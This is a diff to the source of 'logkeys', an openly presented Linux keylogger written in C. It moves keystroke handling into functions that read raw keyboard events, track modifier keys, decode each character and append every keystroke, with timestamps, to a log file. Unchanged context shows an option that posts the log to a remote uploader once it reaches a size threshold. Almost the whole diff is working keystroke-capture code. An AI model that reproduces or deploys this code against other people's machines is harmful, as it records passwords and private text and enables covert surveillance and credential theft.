@@ -61,6 +61,20 @@
 
 namespace logkeys {
 
+#define TIME_FORMAT "%F %T%z > "  // results in YYYY-mm-dd HH:MM:SS+ZZZZ
+
+struct key_state_t {
+  wchar_t key;
+  unsigned int repeats;  // count_repeats differs from the actual number of repeated characters! afaik, only the OS knows how these two values are related (by respecting configured repeat speed and delay)
+  bool repeat_end;
+  input_event event;
+  bool scancode_ok;
+  bool capslock_in_effect = false;
+  bool shift_in_effect = false;
+  bool altgr_in_effect = false;
+  bool ctrl_in_effect = false;  // used for identifying Ctrl+C / Ctrl+D
+} key_state;
+
 // executes cmd and returns string ouput
 std::string execute(const char* cmd)
 {
@@ -370,6 +384,158 @@ void determine_input_device()
 }
 
 
+bool update_key_state()
+{
+// these event.value-s aren't defined in <linux/input.h> ?
+#define EV_MAKE   1  // when key pressed
+#define EV_BREAK  0  // when key released
+#define EV_REPEAT 2  // when key switches to repeating after short delay
+
+  if (read(input_fd, &key_state.event, sizeof(struct input_event)) <= 0) {
+    return false;
+  }
+  if (key_state.event.type != EV_KEY)
+    return update_key_state();  // keyboard events are always of type EV_KEY
+
+  unsigned short scan_code = key_state.event.code; // the key code of the pressed key (some codes are from "scan code set 1", some are different (see <linux/input.h>)
+
+  key_state.repeat_end = false;
+  if (key_state.event.value == EV_REPEAT) {
+    key_state.repeats++;
+    return true;
+  }
+  else if (key_state.event.value == EV_BREAK) {
+    if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
+      key_state.shift_in_effect = false;
+    else if (scan_code == KEY_RIGHTALT)
+      key_state.altgr_in_effect = false;
+    else if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
+      key_state.ctrl_in_effect = false;
+
+    key_state.repeat_end = key_state.repeats > 0;
+    if (key_state.repeat_end)
+      return true;
+    else
+      return update_key_state();
+  }
+  key_state.repeats = 0;
+
+  key_state.scancode_ok = scan_code < sizeof(char_or_func);
+  if (!key_state.scancode_ok)
+    return true;
+
+  key_state.key = 0;
+
+  if (key_state.event.value != EV_MAKE)
+    return update_key_state();
+
+  switch (scan_code) {
+  case KEY_CAPSLOCK:
+    key_state.capslock_in_effect = !key_state.capslock_in_effect;
+    break;
+  case KEY_LEFTSHIFT:
+  case KEY_RIGHTSHIFT:
+    key_state.shift_in_effect = true;
+    break;
+  case KEY_RIGHTALT:
+    key_state.altgr_in_effect = true;
+    break;
+  case KEY_LEFTCTRL:
+  case KEY_RIGHTCTRL:
+    key_state.ctrl_in_effect = true;
+    break;
+  default:
+    if (is_char_key(scan_code)) {
+      wchar_t wch;
+      if (key_state.altgr_in_effect) {
+        wch = altgr_keys[to_char_keys_index(scan_code)];
+        if (wch == L'\0') {
+          if(key_state.shift_in_effect)
+            wch = shift_keys[to_char_keys_index(scan_code)];
+          else
+            wch = char_keys[to_char_keys_index(scan_code)];
+        }
+      }
+
+      else if (key_state.capslock_in_effect && iswalpha(char_keys[to_char_keys_index(scan_code)])) { // only bother with capslock if alpha
+        if (key_state.shift_in_effect) // capslock and shift cancel each other
+          wch = char_keys[to_char_keys_index(scan_code)];
+        else
+          wch = shift_keys[to_char_keys_index(scan_code)];
+        if (wch == L'\0')
+          wch = char_keys[to_char_keys_index(scan_code)];
+      }
+
+      else if (key_state.shift_in_effect) {
+        wch = shift_keys[to_char_keys_index(scan_code)];
+        if (wch == L'\0')
+          wch = char_keys[to_char_keys_index(scan_code)];
+      }
+      else  // neither altgr nor shift are effective, this is a normal char
+        wch = char_keys[to_char_keys_index(scan_code)];
+
+      key_state.key = wch;
+    }
+  }
+  return true;
+}
+
+
+// Writes event to log file and returns the increased file size
+int log_event(FILE *out)
+{
+  int inc_size = 0;
+  unsigned short scan_code = key_state.event.code;
+  char timestamp[32];  // timestamp string, long enough to hold format "\n%F %T%z > "
+
+  if (!key_state.scancode_ok) {  // keycode out of range, log error
+    inc_size += fprintf(out, "<E-%x>", scan_code);
+    return inc_size;
+  }
+
+  if (key_state.repeats) {
+    if (key_state.repeat_end) {
+      if ((args.flags & FLAG_NO_FUNC_KEYS) && is_func_key(key_state.event.code));  // if repeated was function key, and if we don't log function keys, then don't log repeat either
+      else {
+        inc_size += fprintf(out, "<#+%d>", key_state.repeats);
+        fflush(out);
+      }
+    }
+    return inc_size;
+  }
+
+  // on key press
+  if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER ||
+      (key_state.ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
+      // on ENTER key or Ctrl+C/Ctrl+D event append timestamp
+    if (key_state.ctrl_in_effect)
+      inc_size += fprintf(out, "%lc", char_keys[to_char_keys_index(scan_code)]);  // log C or D
+    if (args.flags & FLAG_NO_TIMESTAMPS)
+      inc_size += fprintf(out, "\n");
+    else {
+      strftime(timestamp, sizeof(timestamp), "\n" TIME_FORMAT, localtime(&key_state.event.time.tv_sec));
+      inc_size += fprintf(out, "%s", timestamp);  // then newline and timestamp
+    }
+  }
+  else if (is_char_key(scan_code)) {
+    // print character or string corresponding to received keycode; only print chars when not \0
+    if (key_state.key != L'\0') inc_size += fprintf(out, "%lc", key_state.key);  // write character to log file
+  }
+  else if (is_func_key(scan_code)) {
+    if (!(args.flags & FLAG_NO_FUNC_KEYS)) {  // only log function keys if --no-func-keys not requested
+      inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
+    }
+    else if (scan_code == KEY_SPACE || scan_code == KEY_TAB) {
+      inc_size += fprintf(out, " ");  // but always log a single space for Space and Tab keys
+    }
+  }
+  else inc_size += fprintf(out, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
+
+  fflush(out);
+  return inc_size;
+}
+
+
 int main(int argc, char **argv)
 {  
   on_exit(exit_cleanup, NULL);
@@ -472,23 +638,16 @@ int main(int argc, char **argv)
   // now we've got everything we need, finally drop privileges by becoming 'nobody'
   //setegid(65534); seteuid(65534);   // commented-out, I forgot why xD
   
-  unsigned int scan_code, prev_code = 0;  // the key code of the pressed key (some codes are from "scan code set 1", some are different (see <linux/input.h>)
-  struct input_event event;
+  key_state.capslock_in_effect = execute(COMMAND_STR_CAPSLOCK_STATE).size() >= 2;
+
   char timestamp[32];  // timestamp string, long enough to hold format "\n%F %T%z > "
-  bool capslock_in_effect = execute(COMMAND_STR_CAPSLOCK_STATE).size() >= 2;
-  bool shift_in_effect = false;
-  bool altgr_in_effect = false;
-  bool ctrl_in_effect = false;  // used for identifying Ctrl+C / Ctrl+D
-  int count_repeats = 0;  // count_repeats differs from the actual number of repeated characters! afaik, only the OS knows how these two values are related (by respecting configured repeat speed and delay)
   
   struct stat st;
   stat(args.logfile.c_str(), &st);
   off_t file_size = st.st_size;  // log file is currently file_size bytes "big"
-  int inc_size;  // is added to file_size in each iteration of keypress reading, adding number of bytes written to log file in that iteration
   
   time_t cur_time;
   time(&cur_time);
-#define TIME_FORMAT "%F %T%z > "  // results in YYYY-mm-dd HH:MM:SS+ZZZZ
   strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
   
   if (args.flags & FLAG_NO_TIMESTAMPS)
@@ -498,25 +657,11 @@ int main(int argc, char **argv)
   fflush(out);
   
   // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
-  while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
+  while (update_key_state()) {
+    int inc_size = log_event(out);
+    if (inc_size > 0) file_size += inc_size;
     
-// these event.value-s aren't defined in <linux/input.h> ?
-#define EV_MAKE   1  // when key pressed
-#define EV_BREAK  0  // when key released
-#define EV_REPEAT 2  // when key switches to repeating after short delay
-    
-    if (event.type != EV_KEY) continue;  // keyboard events are always of type EV_KEY
-    
-    inc_size = 0;
-    scan_code = event.code;
-    
-    if (scan_code >= sizeof(char_or_func)) {  // keycode out of range, log error
-      inc_size += fprintf(out, "<E-%x>", scan_code);
-      if (inc_size > 0) file_size += inc_size;
-      continue;
-    }
-    
-    // if remote posting is enabled and size treshold is reached
+    // if remote posting is enabled and size threshold is reached
     if (args.post_size != 0 && file_size >= args.post_size && stat(UPLOADER_PID_FILE, &st) == -1) {
       fclose(out);
       
@@ -554,108 +699,8 @@ int main(int argc, char **argv)
         }
       }
     }
-    
-    // on key repeat ; must check before on key press
-    if (event.value == EV_REPEAT) {
-      ++count_repeats;
-    } else if (count_repeats) {
-      if (prev_code == KEY_RIGHTSHIFT || prev_code == KEY_LEFTCTRL || 
-          prev_code == KEY_RIGHTALT   || prev_code == KEY_LEFTALT  || 
-          prev_code == KEY_LEFTSHIFT  || prev_code == KEY_RIGHTCTRL);  // if repeated key is modifier, do nothing
-      else {
-        if ((args.flags & FLAG_NO_FUNC_KEYS) && is_func_key(prev_code));  // if repeated was function key, and if we don't log function keys, then don't log repeat either
-        else inc_size += fprintf(out, "<#+%d>", count_repeats);
-      }
-      count_repeats = 0;  // reset count for future use
-    }
-    
-    // on key press
-    if (event.value == EV_MAKE) {
-      
-      // on ENTER key or Ctrl+C/Ctrl+D event append timestamp
-      if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER ||
-          (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
-        if (ctrl_in_effect)
-          inc_size += fprintf(out, "%lc", char_keys[to_char_keys_index(scan_code)]);  // log C or D
-        if (args.flags & FLAG_NO_TIMESTAMPS)
-          inc_size += fprintf(out, "\n");
-        else {
-          strftime(timestamp, sizeof(timestamp), "\n" TIME_FORMAT, localtime(&event.time.tv_sec));
-          inc_size += fprintf(out, "%s", timestamp);  // then newline and timestamp
-        }
-        if (inc_size > 0) file_size += inc_size;
-        continue;  // but don't log "<Enter>"
-      }
-      
-      if (scan_code == KEY_CAPSLOCK)
-        capslock_in_effect = !capslock_in_effect;
+  }
 
-      if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
-        shift_in_effect = true;
-      if (scan_code == KEY_RIGHTALT)
-        altgr_in_effect = true;
-      if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
-        ctrl_in_effect = true;
-      
-      // print character or string coresponding to received keycode; only print chars when not \0
-      if (is_char_key(scan_code)) {
-        wchar_t wch;
-        if (altgr_in_effect) {
-          wch = altgr_keys[to_char_keys_index(scan_code)];
-          if (wch == L'\0') {
-            if(shift_in_effect)
-              wch = shift_keys[to_char_keys_index(scan_code)];
-            else
-              wch = char_keys[to_char_keys_index(scan_code)];
-          }
-        } 
-
-        else if (capslock_in_effect && iswalpha(char_keys[to_char_keys_index(scan_code)])) { // only bother with capslock if alpha
-          if (shift_in_effect) // capslock and shift cancel each other
-            wch = char_keys[to_char_keys_index(scan_code)];
-          else
-            wch = shift_keys[to_char_keys_index(scan_code)];
-          if (wch == L'\0')
-            wch = char_keys[to_char_keys_index(scan_code)];
-        }
-        
-        else if (shift_in_effect) {
-          wch = shift_keys[to_char_keys_index(scan_code)];
-          if (wch == L'\0')
-            wch = char_keys[to_char_keys_index(scan_code)];
-        }
-        else  // neither altgr nor shift are effective, this is a normal char
-          wch = char_keys[to_char_keys_index(scan_code)];
-        
-        if (wch != L'\0') inc_size += fprintf(out, "%lc", wch);  // write character to log file
-      }
-      else if (is_func_key(scan_code)) {
-        if (!(args.flags & FLAG_NO_FUNC_KEYS)) {  // only log function keys if --no-func-keys not requested
-          inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
-        } 
-        else if (scan_code == KEY_SPACE || scan_code == KEY_TAB) {
-          inc_size += fprintf(out, " ");  // but always log a single space for Space and Tab keys
-        }
-      }
-      else inc_size += fprintf(out, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
-    } // if (EV_MAKE)
-    
-    // on key release
-    if (event.value == EV_BREAK) {
-      if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
-        shift_in_effect = false;
-      if (scan_code == KEY_RIGHTALT)
-        altgr_in_effect = false;
-      if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
-        ctrl_in_effect = false;
-    }
-    
-    prev_code = scan_code;
-    fflush(out);
-    if (inc_size > 0) file_size += inc_size;
-    
-  } // while (read(input_fd))
-  
   // append final timestamp, close files and exit
   time(&cur_time);
   strftime(timestamp, sizeof(timestamp), "%F %T%z", localtime(&cur_time));
